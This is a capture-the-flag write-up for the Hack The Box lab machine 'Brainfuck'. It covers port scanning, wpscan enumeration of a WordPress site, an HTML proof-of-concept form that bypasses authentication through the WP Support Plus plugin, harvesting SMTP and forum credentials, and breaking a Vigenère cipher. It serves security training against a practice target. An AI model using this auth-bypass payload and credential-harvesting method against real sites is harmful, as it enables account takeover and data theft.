# Brainfuck
**Machine ip:** 10.10.10.17

## Enumeration
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.17 -e tun0 > ports`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2131bd03-d3bc-47ad-b0e0-5386ecbaaed1)

+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.17`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/79e9437c-d796-444d-bd1b-4baead8ea885)

+ Check scan results, and see subdomains.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ce226c16-5d40-40ca-956a-1d2105d79691)

+ Navigate to `https://10.10.10.17`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e76efcd5-a6e6-4c52-85d6-2bf7e53ab1c6)

+ Control TLS certificate.
+ Subdomains and `orestis@brainfuck.htb` mail address.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c11338d1-dd89-4813-a8b0-c65bd48adffa)

+ Add subdomains into `/etc/hosts` file.                        
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b7b15b39-ace4-4dd3-acf5-f0e3de926e54)

+ Navigate to `https://brainfuck.htb` or `https://www.brainfuck.htb` as they're the same.
+ There is a Wordpress site.
+ admin account username, SMTP integration and `orestis@brainfuck.htb` mail address.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/13aa2d1f-c897-4bfa-8a00-e6b4857f4843)

+ Go to `/wp-admin` , and see Wordpress login page. You can try default username:passwords.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4bb3416-457e-4aad-af23-4e967edf01ac)

+ Instead of brute force trial and errors, use wpscan: `wpscan --url https://brainfuck.htb/ -e ap,at,u --disable-tls-checks`
```
└─$ wpscan --url https://brainfuck.htb/ -e ap,at,u --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Thu Jan  4 06:18:56 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2024-01-03T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 7.8
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:07:53 <===========================> (26699 / 26699) 100.00% Time: 00:07:53
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2024-01-03T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 7.8
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/, status: 403
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css, Match: 'Version: 1.0.6'

[+] specia
 | Location: https://brainfuck.htb/wp-content/themes/specia/
 | Last Updated: 2024-01-01T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/specia/readme.txt
 | [!] The version is out of date, the latest version is 8.3
 | Style URL: https://brainfuck.htb/wp-content/themes/specia/style.css
 | Style Name: Specia
 | Style URI: https://speciatheme.com/specia-free-wordpress-theme/
 | Description: Specia is a Multipurpose WordPress theme with lots of powerful features, instantly giving a professi...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/themes/specia/, status: 500
 |
 | Version: 2.1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/specia/style.css, Match: 'Version: 2.1.1'

[+] twentyfifteen
 | Location: https://brainfuck.htb/wp-content/themes/twentyfifteen/
 | Last Updated: 2023-11-07T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.6
 | Style URL: https://brainfuck.htb/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.7'

[+] twentyseventeen
 | Location: https://brainfuck.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-11-07T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.4
 | Style URL: https://brainfuck.htb/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.1'

[+] twentysixteen
 | Location: https://brainfuck.htb/wp-content/themes/twentysixteen/
 | Last Updated: 2023-11-07T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: https://brainfuck.htb/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:20 <=================================> (10 / 10) 100.00% Time: 00:00:20

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan  4 06:27:39 2024
[+] Requests Done: 26771
[+] Cached Requests: 25
[+] Data Sent: 6.918 MB
[+] Data Received: 4.633 MB
[+] Memory used: 376.457 MB
[+] Elapsed time: 00:08:43
                                                                                    
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/604aa140-e2bc-4eca-b553-30c582aa3e6a)

+ wpscan again to verify: `wpscan --url https://brainfuck.htb/ --disable-tls-checks`
```
└─$ wpscan --url https://brainfuck.htb/ --disable-tls-checks  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.10.10.17]
[+] Started: Thu Jan  4 06:29:43 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2024-01-03T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 7.8
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan  4 06:30:03 2024
[+] Requests Done: 172
[+] Cached Requests: 6
[+] Data Sent: 43.882 KB
[+] Data Received: 180.81 KB
[+] Memory used: 253.254 MB
[+] Elapsed time: 00:00:20

```                                                                                  
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b2df998-238a-4263-8cff-0bbee8e29fdd)

+ Navigate to `sup3rs3cr3t.brainfuck.htb`
+ It's a forum.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/60122739-9020-453f-952e-8d4c95534b79)


## Findings
+ nmap results.
+ TLS certificate.
+ 1 domain and 1 subdomain.
+ Wordpress site.
+ wpscan results.
+ Forum.

## Exploits
+ Review wpscan results, and there is a vulnerable plugin on exploit-db: [wp-support-plus-responsive-ticket-system](https://www.exploit-db.com/exploits/41006)
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b4440278-7ab2-4a1d-bc5a-35f39ba3f14c)

+ Generate POC modifying the domain on a HTML file:
```
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
  Username: <input type="text" name="username" value="administrator">
  <input type="hidden" name="email" value="sth">
  <input type="hidden" name="action" value="loginGuestFacebook">
  <input type="submit" value="Login">
</form>
```
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/837a52be-d8e5-4bf9-ba8a-3fe84e4873bc)

+ Click login button. The page is empty.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1f4da866-bdbc-40fa-8526-04606bd85d23)

+ Navigate to `https://brainfuck.htb/` and refresh. Logged as administrator without authentication.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27a66df1-dd3b-40f4-95b8-4ca18bd03537)

+ Change username `administrator` to `admin` on the POC.
+ Go to `https://brainfuck.htb/wp-admin/` , and redirects to admin panel without authentication.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec18c42b-9394-44b3-858f-3e24464f4fda)

+ Click on the plugin, and choose `Easy WP SMTP`.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f793f890-82bb-44cc-a78c-f1cda55179a1)

+ Inspect the password value on the settings on page source view:
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e51b96af-a6eb-4d8d-abd8-5b6f7037a110)

+ Got the username and password for SMTP service: `orestis`:`kHGuERB29DNiNE`
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/82d080a3-84cc-4d11-beb9-56d82faaf609)

+ Let’s move to the port 110 and see if this user have any emails:
```
┌──(kali㉿kali)-[~]
└─$ nc 10.10.10.17 110
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
RETR  
-ERR Invalid message number: 
RETR 1
+OK 977 octets
Return-Path: <www-data@brainfuck.htb>
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/
.
RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
.

```                                               
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4d94daac-2cf2-46d9-8c14-df834c6ccdec)

+ Login `https://sup3rs3cr3t.brainfuck.htb/` using  `orestis`:`kHGuERB29DNiNE` credentials:
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/567ba3d0-7263-4b29-9471-66a57411d765)

+ Check the forum especially `Key` and `SSH Access` parts.
+ `Key` thread seems encrypted.
+ Each orestis’ posts' second lines on both `Key` and `SSH Access` are in the same structure.
+ 7 letter word + dash + 7 letter word + 3 letter word + and + 6 letter word, even if the letters are being changed.
```
Orestis - Hacking for fun and profit -> Pieagnm - Jkoijeg nbw zwx mle grwsnn
Orestis - Hacking for fun and profit -> Wejmvse - Fbtkqal zqb rso rnl cwihsf
Orestis - Hacking for fun and profit -> Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2ed038c9-2ce2-4e8b-b8b3-71e1eab1cffd)
<br>
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3b9183ae-e7db-43af-9802-499bfbaa79e5)

+ It looks like Vigenère cipher. But yet, check it. You can benefit from the followings:
https://www.boxentriq.com/code-breaking/cipher-identifier
https://merri.cx/enigmator/cryptanalysis/crypto_identifier.html
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e52c7fd7-e3f3-4143-b35f-7c04195a0fc1)
<br>
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/42cb4616-ed4f-4f9d-897c-ee142fd968c8)

+ Find out the key using [Vigenère cipher](https://planetcalc.com/2468/):
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d44c7045-3017-488b-9470-a296e88e9c36)

+ Alternatively using [Vigenere-Cipher-Key-Finder](https://github.com/4st1nus/Vigenere-Cipher-Key-Finder):
```
┌──(kali㉿kali)-[~/Desktop/Tools/Cipher/Vigenere-Cipher-Key-Finder]
└─$ python2 decipher.py
Vigenere Decipher

Text must be entered without Symbols or Space

Enter Known Text: OrestisHackingforfunandprofit
Enter the corresponding Encrypted text to the known text: QbqquzsPnhekxsdpifcafhfzdmgzt
ckmybrainfuckmybrainfuckmybra
                                    
```                                     
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2d1734ba-a453-4b3f-b34b-c8547ca1dc6e)

+ Crack the 'mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja'. It looks like a url.
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/38fe4034-b7a5-4363-a5b0-ae2ce8317df4)

+ Alternatively, you can use [cyberchef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('fuckmybrain')&input=bW52emU6Ly96c3JpdnN6d20ucmZ6LzhjcjVhaTEwcjkxNTIxODY5N2kxdzY1OGVucWMwY3M4L296cnhua2MvdWJfc2ph) and [boxentriq](https://www.boxentriq.com/code-breaking/vigenere-cipher).


## Tools
+ masscan
+ nmap
+ wpscan


# References & Alternatives:
+ https://medium.com/@v1per/brainfuck-hackthebox-writeup-9a326bcb426a
+ https://4st1nus.gitbook.io/hackthebox/htb/hack-the-box-brainfuck-walkthrough-without-metasploit
+ https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html
+ https://medium.com/@toneemarqus/brainfuck-htb-manual-walkthrough-2023-oscp-prep-47858603b2d6
+ https://benheater.com/hackthebox-brainfuck/
